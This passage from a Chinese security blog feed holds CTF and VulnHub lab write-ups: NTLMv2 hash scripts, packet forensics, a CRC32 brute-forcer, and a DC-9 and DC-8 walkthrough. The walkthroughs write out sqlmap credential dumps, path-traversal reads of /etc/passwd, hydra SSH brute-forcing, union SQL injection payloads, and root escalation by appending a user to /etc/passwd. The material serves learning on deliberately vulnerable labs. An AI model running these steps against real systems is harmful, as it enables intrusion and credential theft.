哈希函数的基于哈希的消息身份验证代码）进行完整性检查，并使用 MD4进行加密。4.增强的安全性5.兼容性 NTLMv2也向后兼容NTML协议6.域身份验证</code></pre><pre><code>NTLM认证采用质询/应答（Challenge/Response）的消息交换模式，流程如下：1.客户端向服务器发送一个请求，请求中包含明文的登录用户名。服务器会提前存储登录用户名和对应的密码hash2.服务器接收到请求后，生成一个16位的随机数(这个随机数被称为Challenge),明文发送回客户端。使用存储的登录用户密码hash加密Challenge，获得Challenge13.客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，获得Challenge2(这个结果被称为response)，将response发送给服务器4.服务器接收客户端加密后的response，比较Challenge1和response，如果相同，验证成功在以上流程中，登录用户的密码hash即NTLM hash，response中包含Net-NTLM hash这上面提到的NTLM包括NTLMv1 NTLMv2 NTLM sessionV2三种协议 不同协议使用不同格式的challenge和加密算法 因此也就区分出了NETntlmv1 hash和NETntlmv2 hashNTLMv2的格式是username::domain:challenge:HMAC-MD5:blob其中domain是IP或者机器名challenge是上面提到的服务器收到请求之后生成的随机数 体现在流量包中是NTLM Server ChallengeHMAC-MD5在流量包中体现为NTProofstrblob是上面提到的使用用户登陆的密码对challenge进行加密之后的challenge1(即response)的值去掉NTProofstr的部分</code></pre><p>那么对照上面说的NTLMv2的格式 我们这个题中<code>xxx</code>的部分很明显就是缺少了HMAC-MD5部分的值  好在我们有用户admin的登陆密码 可以计算出这部分缺失的值 同时计算出该用户的NTLMv2 hash值</p><p>下面是计算流程</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226818.png" alt="image-20240429170531714"></p><p>计算方法参考<a href="https://stackoverflow.com/questions/32272615/is-it-possible-to-convert-netmtlmv2-hash-to-ntlm-hash">由NTLM哈希计算出NETntlmv2哈希</a>  我们使用python2和python3两个版本来实现这个计算过程</p><pre><code class="python"># python2# python2import hashlibimport binasciiimport hmacinput_ntml = raw_input(&quot;please input password:&quot;)_ntml = hashlib.new(&quot;md4&quot;,input_ntml.encode(&quot;utf-16-le&quot;)).digest()ntlm = binascii.hexlify(_ntml)input_user = raw_input(&quot;please input username:&quot;)input_domain = raw_input(&quot;please input domain:&quot;)input_user_and_domain = input_user + input_domainencode_user_and_domain = input_user_and_domain.upper().encode(&quot;utf-16-le&quot;).encode(&quot;hex&quot;)firstHMAC = hmac.new(ntlm.decode(&quot;hex&quot;), encode_user_and_domain.decode(&quot;hex&quot;), hashlib.md5).hexdigest()input_challange = raw_input(&quot;please input challenge:&quot;)input_blob = raw_input(&quot;please input blob:&quot;)type2challenge = input_challange + input_blobntlmv2 = hmac.new(firstHMAC.decode(&quot;hex&quot;), type2challenge.decode(&quot;hex&quot;), hashlib.md5).hexdigest()print(&quot;NTLMv2 is:&quot;+ ntlmv2)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226464.png" alt="image-20240429174403973"></p><pre><code class="python"># python3import hashlibimport binasciiimport hmac# 计算密码的ntlm hash值input_ntml = input(&quot;please input password:&quot;)_ntml = hashlib.new(&quot;md4&quot;, input_ntml.encode(&quot;utf-16-le&quot;)).digest()ntlm = binascii.hexlify(_ntml)# 计算用户名和域名的编码值input_user = input(&quot;please input username:&quot;)input_domain = input(&quot;please input domain:&quot;)input_user_and_domain = input_user + input_domainencode_user_and_domain = binascii.hexlify(input_user_and_domain.upper().encode(&quot;utf-16-le&quot;))# 计算HMAC-hash值firstHMAC = hmac.new(binascii.unhexlify(ntlm), binascii.unhexlify(encode_user_and_domain), hashlib.md5).hexdigest()# 计算NTLMv2 hash值input_challenge = input(&quot;please input challenge:&quot;)input_blob = input(&quot;please input blob:&quot;)type2challenge = input_challenge + input_blobntlmv2 = hmac.new(binascii.unhexlify(firstHMAC), binascii.unhexlify(type2challenge.encode()), hashlib.md5).hexdigest()print(&quot;NTLMv2 is:&quot; + ntlmv2)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226056.png" alt="image-20240429174433304"></p><p>最终算出admin用户的NTLMv2哈希值为<code>efa243f442b9d683eb1b00a2b1a0c9fc</code></p><p>使用这个值就可以解压压缩包 得到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226647.png" alt="image-20240429174554406"></p><h2 id="Wireshark2-1"><a href="#Wireshark2-1" class="headerlink" title="Wireshark2.1"></a>Wireshark2.1</h2><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281640078.png" alt="image-20240428164034035"></p><p>很显然是theanswerishere.php</p><h2 id="Wireshark2-2"><a href="#Wireshark2-2" class="headerlink" title="Wireshark2.2"></a>Wireshark2.2</h2><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281643179.png" alt="image-20240428164317144"></p><p>刚开始写的2 错误 输入3 对了</p><h2 id="Wireshark2-3"><a href="#Wireshark2-3" class="headerlink" title="Wireshark2.3"></a>Wireshark2.3</h2><pre><code>id=0%27%20union%20select%201,2,group_concat(th1sfI4g)%20from%20fl4g--+</code></pre><p>这句查询语句</p><p>很明显列名是th1sfI4g</p><h2 id="Wireshark2-4"><a href="#Wireshark2-4" class="headerlink" title="Wireshark2.4"></a>Wireshark2.4</h2><p>在最后一行直接追踪http流</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281645495.png" alt="image-20240428164531407"></p><h2 id="WeirdUSB-1"><a href="#WeirdUSB-1" class="headerlink" title="WeirdUSB.1"></a>WeirdUSB.1</h2><p>使用取证大师分析 问下载 直接搜download</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281648437.png" alt="image-20240428164854359"></p><p>合并显示 发现目标文件名</p><pre><code>212633.crdownload</code></pre><h2 id="WeirdUSB-2"><a href="#WeirdUSB-2" class="headerlink" title="WeirdUSB.2"></a>WeirdUSB.2</h2><p>发现Area2&#x2F;Job2目录下的docx文件是唯一一个访问时间和修改时间相同的</p><p>猜测是该目录下的txt文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281658734.png" alt="image-20240428165840676"></p><h2 id="fake-php"><a href="#fake-php" class="headerlink" title="fake_php"></a>fake_php</h2><p>随便输入一些 抓个包 看到要crc32校验</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281653267.png" alt="image-20240428165332188"></p><p>写个脚本进行爆破</p><pre><code class="python">import itertoolsimport zlib# 要匹配的CRC32校验值target_crc32 = 0xb4a5bb5a# 可能的字符集：大小写字母和数字chars = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789#@!%$^&amp;*&#39;# 使用itertools.product生成所有可能的四位字符组合for combo in itertools.product(chars, repeat=4):    # 将字符元组转换为字符串    four_letter_combo = &#39;&#39;.join(combo) + &#39;-/flag&#39;    # 计算拼接字符串的CRC32校验值    crc32_result = zlib.crc32(four_letter_combo.encode(&#39;utf-8&#39;)) &amp; 0xffffffff    # 检查校验值是否与目标匹配    if crc32_result == target_crc32:        # 如果找到匹配，打印结果并停止        print(f&quot;Found matching string: &#123;four_letter_combo&#125;&quot;)        breakelse:    print(&quot;No matching string found.&quot;)</code></pre><p>爆到了S!@#</p><p>写入admin.php 抓包输入上面密码的url密码 得到adminS3cr3t.php</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281657577.png" alt="image-20240428165730488"></p><p>访问</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281658968.png" alt="image-20240428165803920"></p><p>下面参照</p><p><a href="https://spyclub.tech/2020/08/02/inctf2020-gosqlv3-challenge-writeup/#Phase-1-Being-the-admin">https://spyclub.tech/2020/08/02/inctf2020-gosqlv3-challenge-writeup/#Phase-1-Being-the-admin</a></p><p>存在一个sql绕过 直接打poc 出flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281658353.png" alt="image-20240428165822285"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> web </tag>
            
            <tag> forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶场记录DC-9</title>
      <link href="/2024/04/13/vulnhub%E9%9D%B6%E5%9C%BADC-9/"/>
      <url>/2024/04/13/vulnhub%E9%9D%B6%E5%9C%BADC-9/</url>
      
        <content type="html"><![CDATA[<h1 id="vulnhub靶场DC-9"><a href="#vulnhub靶场DC-9" class="headerlink" title="vulnhub靶场DC-9"></a>vulnhub靶场DC-9</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>DC-9 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.The ultimate goal of this challenge is to get root and to read the one and only flag.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#39;t give you the answer, instead, I&#39;ll give you an idea about how to move forward.</code></pre><p>这次靶场描述没有给到什么信息</p><h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><p>先扫ip</p><pre><code>nmap 192.168.204.0/24</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404132128103.png" alt="image-20240413212816063"></p><p>靶场ip为<code>192.168.204.138</code></p><p>再扫端口</p><pre><code>nmap -A -p- -v 192.168.204.138</code></pre><p>只开放了tcp服务 80端口 使用Apache中间件 版本2.4.38</p><p>ssh服务此时显示的是filtered 被过滤了 这里是一个伏笔</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151949734.png" alt="image-20240415194924702"></p><p>再来扫一下指纹信息</p><pre><code>whatweb -v http://192.168.204.138/</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404132133436.png" alt="image-20240413213315387"></p><p>扫一下目录 </p><pre><code>python3 dirsearch.py -u http://192.168.204.138/ -i 200</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404132137726.png" alt="image-20240413213735695"></p><h3 id="二、访问web站点"><a href="#二、访问web站点" class="headerlink" title="二、访问web站点"></a>二、访问web站点</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151108793.png" alt="image-20240415110806734"></p><p>发现两个可能存在问题的页面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151130487.png" alt="image-20240415113001414"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151130693.png" alt="image-20240415113006626"></p><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>直接用xray扫一遍 </p><pre><code>.\xray_windows_amd64.exe webscan --basic-crawler http://192.168.204.138/ --html-output out.html</code></pre><p>查看out.html 看来是results.php页面存在sql注入</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151150014.png" alt="image-20240415115022932"></p><p>直接上sqlmap</p><pre><code>python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; --dbs --level=5</code></pre><p>要写<code>--date &quot;search=123456&quot;</code> 参数是因为我们在search.php页面搜索框输入内容之后 会直接跳转到results.php 使用POST方法传入一个<code>search</code>参数</p><p>有三个数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151509572.png" alt="image-20240415150917512"></p><p>先爆users数据库的表</p><pre><code>python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D users --tables --level=5 </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151510643.png" alt="image-20240415151047575"></p><p>爆字段 </p><pre><code>python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D users -T UserDetails --columns --level=5 </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151511447.png" alt="image-20240415151157366"></p><p>爆用户名和密码</p><pre><code>python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D users -T UserDetails -C &quot;password,username&quot; --dump --level=5</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151513568.png" alt="image-20240415151306497"></p><p>得到了普通用户的用户名和密码</p><p>接着来爆Staff数据库 </p><pre><code>python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D Staff --tables --level=5python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D Staff -T Users --columns --level=5 python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D Staff -T Users --dump --level=5</code></pre><p>得到表中的admin用户密码是哈希值 但是sqlmap可以直接进行爆破 得到明文是<code>transorbital1</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151519482.png" alt="image-20240415151903397"></p><h4 id="登陆网站"><a href="#登陆网站" class="headerlink" title="登陆网站"></a>登陆网站</h4><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151520596.png" alt="image-20240415152003554"></p><p>使用上面爆破出来的密码成功登陆  但是看到下面的<code>File does not exist</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151520427.png" alt="image-20240415152026369"></p><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>想到存在文件包含 </p><pre><code>http://192.168.204.138/manage.php?file=../../../../etc/passwd</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151939819.png" alt="image-20240415193910763"></p><p>成功执行 发现其中的很多用户都在我们上面爆出来的数据库中的普通用户中出现过 </p><h3 id="三、ssh远程连接靶机"><a href="#三、ssh远程连接靶机" class="headerlink" title="三、ssh远程连接靶机"></a>三、ssh远程连接靶机</h3><h4 id="敲门服务"><a href="#敲门服务" class="headerlink" title="敲门服务"></a>敲门服务</h4><p>看到很多用户都在那我们应该尝试使用ssh进行连接靶机 但是之前我们在扫描端口的时候发现22端口开放的ssh服务显示的是被过滤的状态 搜一下这个情况</p><p><a href="https://cloud.tencent.com/developer/article/1782065">通过Knockd隐藏SSH，让黑客看不见你的服务器</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404152002647.png" alt="image-20240415200255585"></p><p>看到是使用了knockd端口敲门服务 隐藏了ssh服务</p><p><a href="https://www.cnblogs.com/f-carey/p/16066178.html">knockd端口敲门服务</a></p><pre><code>端口敲门服务，即：knockd服务。该服务通过动态的添加iptables规则来隐藏系统开启的服务，使用自定义的一系列序列号来“敲门”，使系统开启需要访问的服务端口，才能对外访问。不使用时，再使用自定义的序列号来“关门”，将端口关闭，不对外监听。进一步提升了服务和系统的安全性。</code></pre><p>为了可以重新开启ssh服务 我们要查看敲门服务的配置文件<code>/etc/knockd.conf</code> </p><pre><code>http://192.168.204.138/manage.php?file=../../../../etc/knockd.conf</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404152006026.png" alt="image-20240415200604990"></p><p>我们可以从配置文件中得到出来敲门暗号的顺序 </p><pre><code>sequence = 7469,8475,9842  # 开启服务顺序sequence = 9842,8475,7469  # 关闭服务顺序</code></pre><p>下面我们就利用敲门暗号来开启被过滤的ssh服务</p><pre><code class="bash">apt install knockd  # 安装knockdsystemctl start knockd # 启动knockd服务knock 192.168.204.138 7469 8475 9842  # 使用暗号进行敲门nmap -A -p- 192.168.204.138  # 扫描靶机端口</code></pre><p>可以看到靶机的ssh服务成功被开启</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404152021880.png" alt="image-20240415202126831"></p><h4 id="hydra爆破用户密码"><a href="#hydra爆破用户密码" class="headerlink" title="hydra爆破用户密码"></a>hydra爆破用户密码</h4><p>将刚刚数据库中的用户名和密码单独放到两个字典文件中 <font color='red'> 这里要注意 用户名和密码字典中每行用户名和密码后面千万不能有空格 否则是爆不出来的 <del>问就是血的教训QAQ</del></font></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404152034860.png" alt="image-20240415203445829"></p><p>使用hydra进行爆破</p><pre><code class="bash">hydra -L username.txt -P passwd.txt ssh://192.168.204.138</code></pre><p>爆破出三组用户 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162108924.png" alt="image-20240416210803862"></p><pre><code>login: chandlerb   password: UrAG0D!login: joeyt   password: Passw0rdlogin: janitor   password: Ilovepeepee</code></pre><p>用这三个用户都登陆一下靶机 发现登陆到janitor靶机的时候 在登陆后的默认文件夹中有个隐藏文件夹 另外两个用户里面没有</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162121760.png" alt="image-20240416212109728"></p><p>进入文件夹 查看里面的文件<code>passwords-found-on-post-it-notes.txt</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162122905.png" alt="image-20240416212217860"></p><p>看起来还是密码 将这几个密码放入刚才的密码字典中 在爆破一下 发现又爆破出一个用户<code>fredf</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162125625.png" alt="image-20240416212534564"></p><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>用这个用户在ssh连接一下 执行<code>sudo -l</code>命令看一下可以使用的sudo权限命令 发现<code>/opt/devstuff/dist/test/test</code> 这个文件可以无密码以sudo权限执行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162225736.png" alt="image-20240416222540670"></p><p>我们进入文件夹 读取一下这个文件的内容 是一个linux中的可执行程序</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162231229.png" alt="image-20240416223137150"></p><p>尝试运行 发现回显是</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404171446154.png" alt="image-20240416223630531"></p><p>告诉了我们test.py的使用方法  那我们来找一下这个文件</p><pre><code>find / -name &quot;test.py&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162242150.png" alt="image-20240416224204963"></p><p>进行读取</p><pre><code class="python">#!/usr/bin/pythonimport sysif len (sys.argv) != 3 :    print (&quot;Usage: python test.py read append&quot;)    sys.exit (1)else :    f = open(sys.argv[1], &quot;r&quot;)    output = (f.read())    f = open(sys.argv[2], &quot;a&quot;)    f.write(output)    f.close()</code></pre><p>这段代码的意思就是读取参数1中的内容 将这个内容追加到参数2中 同时 运行时的参数不是3的话 就会报错</p><p>那我们就可以在创建一组用户名和密码 将这个内容写入&#x2F;etc&#x2F;passwd文件中 在切换用户 就可以获得root权限</p><p>先用openssl生成一个加盐的密码</p><pre><code>openssl passwd -1 -salt admin admin# $1$admin$1kgWpnZpUx.vTroWPXPIB0</code></pre><p>利用test可执行程序将这个新用户添加到<code>/etc/passwd</code></p><pre><code>echo &#39;admin:$1$admin$1kgWpnZpUx.vTroWPXPIB0:0:0::/root:/bin/bash&#39; &gt; /tmp/passwdsudo /opt/devstuff/dist/test/test  /tmp/passwd /etc/passwd</code></pre><p>在切换用户 已经是roo权限</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162313083.png" alt="image-20240416231342990"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162314972.png" alt="image-20240416231419833"></p><pre><code>███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝                                                                             Congratulations - you have done well to get to this point.Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all thosewho have taken the time to complete the various DC challenges.I also want to send out a big thank you to the various members of @m0tl3ycr3w .They are an inspirational bunch of fellows.Sure, they might smell a bit, but...just kidding.  :-)Sadly, all things must come to an end, and this will be the last everchallenge in the DC series.So long, and thanks for all the fish.</code></pre><p>至此 我们拿到了flag  DC系列靶机也告一段落 </p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.xray扫到sql注入漏洞</p><p>2.sqlmap进行自动化注入 找到网站登陆账密 和普通用户账密</p><p>3.使用普通用户账密 hydra爆破靶机登陆账密 </p><p>4.敲门服务 连接ssh</p><p>4.找到隐藏文件 切换用户</p><p>5.可执行程序 添加root用户提权</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023FIC(除了两个程序分析)</title>
      <link href="/2024/04/13/2023FIC/"/>
      <url>/2024/04/13/2023FIC/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9fb43e0121b98b661ac3613444f8ebabff674ecfa51fb767f22a74957b654905"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看喔</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 取证 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023浙警联合赛</title>
      <link href="/2024/04/11/2023%E6%B5%99%E8%AD%A6%E8%81%94%E5%90%88%E8%B5%9B/"/>
      <url>/2024/04/11/2023%E6%B5%99%E8%AD%A6%E8%81%94%E5%90%88%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="f8fa481c3dae392fa2c1d10c51ebd6d8021f2c9b2b29498819c82d7fdef98bd6"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看喔</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 取证 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶场记录DC-8</title>
      <link href="/2024/04/03/vulnhub%E9%9D%B6%E5%9C%BADC-8/"/>
      <url>/2024/04/03/vulnhub%E9%9D%B6%E5%9C%BADC-8/</url>
      
        <content type="html"><![CDATA[<h1 id="vulnhub靶场DC-8"><a href="#vulnhub靶场DC-8" class="headerlink" title="vulnhub靶场DC-8"></a>vulnhub靶场DC-8</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>DC-8 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.This challenge is a bit of a hybrid between being an actual challenge, and being a &quot;proof of concept&quot; as to whether two-factor authentication installed and configured on Linux can prevent the Linux server from being exploited.The &quot;proof of concept&quot; portion of this challenge eventuated as a result of a question being asked about two-factor authentication and Linux on Twitter, and also due to a suggestion by @theart42.The ultimate goal of this challenge is to bypass two-factor authentication, get root and to read the one and only flag.You probably wouldn&#39;t even know that two-factor authentication was installed and configured unless you attempt to login via SSH, but it&#39;s definitely there and doing it&#39;s job.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#39;t give you the answer, instead, I&#39;ll give you an idea about how to move forward.</code></pre><p>靶场描述里面告诉我们 DC-8靶场利用了双因素身份验证 最终目标是绕过双因素身份验证，获取root并读取flag 在渗透过程中可能需要使用ssh登陆</p><pre><code>双因素身份验证（Two-Factor Authentication，简称2FA）是一种增强账户安全性的方法，它要求用户在登录时提供两个不同的身份验证因素，通常是密码和另外一种验证方式，如手机验证码、指纹识别、硬件令牌等。这种方法可以有效防止仅仅依靠密码登录账户时可能出现的安全漏洞。通过使用双因素身份验证，即使黑客获取了用户的密码，也无法直接登录账户，因为他们没有第二个身份验证因素。这样可以大大提高账户的安全性，减少被盗号的风险。常见的双因素身份验证方式包括：短信验证码：用户在登录时会收到一条包含验证码的短信，需要输入正确的验证码才能完成登录。软件令牌：用户需要在手机上安装一个生成动态验证码的应用程序，每次登录时需要输入正确的动态验证码。硬件令牌：类似于软件令牌，但是使用物理设备生成动态验证码，如USB密钥或智能卡。生物识别：使用指纹、面部识别或虹膜扫描等生物特征进行身份验证。使用双因素身份验证可以提高账户的安全性，因为即使密码泄露，黑客也无法轻易登录账户。同时，双因素身份验证也可以用于其他敏感操作，如支付、修改账户信息等。</code></pre><h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><p>先扫ip</p><pre><code>nmap 192.168.204.0/24</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404032133501.png" alt="image-20240403213329416"></p><p>ip为<code>192.168.204.134</code> 开放了22端口和80端口</p><p>再扫端口</p><pre><code>nmap -A -p- -v 192.168.204.134</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404032134296.png" alt="image-20240403213454191"></p><pre><code>开放22端口 开放22端口 存在ssh服务 Openssh 版本7.4p1开放80端口 存在web服务 使用Apache中间件 版本2.4.25</code></pre><p>此外我们还可以得知 网站在robots.txt文件中对爬虫或者搜索引擎不能访问的地址进行了限制 下面这些地址是不能访问的</p><pre><code>/includes/ /misc/ /modules/ /profiles/ /scripts/ /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt /LICENSE.txt /MAINTAINERS.txt</code></pre><p>还看到这个网站使用的框架是Drupal7</p><pre><code>http-generator: Drupal 7 (http://drupal.org)</code></pre><p>再用whatweb来看一下指纹信息</p><pre><code>whatweb -v http://192.168.204.134 </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404041812860.png" alt="image-20240404181247801"></p><p>接下来扫目录 只查看状态码为200的目录</p><pre><code>python3 dirsearch.py -u http://192.168.204.134 -i 200 </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404041815828.png" alt="image-20240404181546792"></p><p>扫出后台登陆地址</p><pre><code>/user/login</code></pre><h3 id="二、访问网站"><a href="#二、访问网站" class="headerlink" title="二、访问网站"></a>二、访问网站</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404041820721.png" alt="image-20240404182015674"></p><p>点一下<code>Welcome to DC-8</code>看到url中出现nid参数</p><pre><code>http://192.168.204.134/?nid=1</code></pre><p>先输入万能钥匙看一下</p><pre><code>1&#39; or 1=1--+</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404041939894.png" alt="image-20240404193946860"></p><p>存在sql注入 复习一波手工注入</p><h4 id="1-联合查询猜字段数"><a href="#1-联合查询猜字段数" class="headerlink" title="1.联合查询猜字段数"></a>1.联合查询猜字段数</h4><p>我们观察上面的报错 发现不需要在最后加上<code>;</code>  也不需要在1后面加<code>&#39;</code></p><pre><code>http://192.168.204.134/?nid=1 order by 2</code></pre><p>到2就回显报错 说明字段数为1 </p><h4 id="2-查询数据库名"><a href="#2-查询数据库名" class="headerlink" title="2.查询数据库名"></a>2.查询数据库名</h4><p>因为只有一个字段 也不需要在测试回显了 我们直接开始查询</p><pre><code>http://192.168.204.134/?nid=9 union select database()</code></pre><p>查到数据库名</p><pre><code>d7db</code></pre><h4 id="3-查询表名"><a href="#3-查询表名" class="headerlink" title="3.查询表名"></a>3.查询表名</h4><pre><code>http://192.168.204.134/?nid=9 union select group_concat(table_name) from information_schema.tables where table_schema=database()</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042000425.png" alt="image-20240404200016380"></p><h4 id="4-查询表中字段名"><a href="#4-查询表中字段名" class="headerlink" title="4.查询表中字段名"></a>4.查询表中字段名</h4><pre><code>http://192.168.204.134/?nid=9 union select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;</code></pre><p><img 